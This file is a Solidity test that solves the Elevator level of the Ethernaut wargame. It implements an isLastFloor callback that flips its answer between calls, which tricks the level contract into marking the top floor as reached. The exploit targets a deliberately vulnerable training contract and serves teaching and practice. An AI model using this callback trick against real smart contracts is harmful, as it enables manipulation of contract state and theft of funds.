// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level11 {
    function goTo(uint256) external;
}

contract Level11Test is EthernautTest {
    function testLevel11() public {
        _createLevel("11");

        // We can call goTo on the elevator with any number
        // The goTo function calls back to this contract
        // Add a isLastFloor function that returns false the first time
        // Then returns true the second time, setting the floor and top floor to true
        Level11(levelInstance["11"]).goTo(0);

        require(_submitLevel("11"));
    }

    // State variable to flip the return value
    bool flip = false;

    // Elevator calls this function
    // First call returns false, second call returns true
    function isLastFloor(uint256) external returns (bool) {
        bool result = flip;
        flip = !flip;
        return result;
    }
}
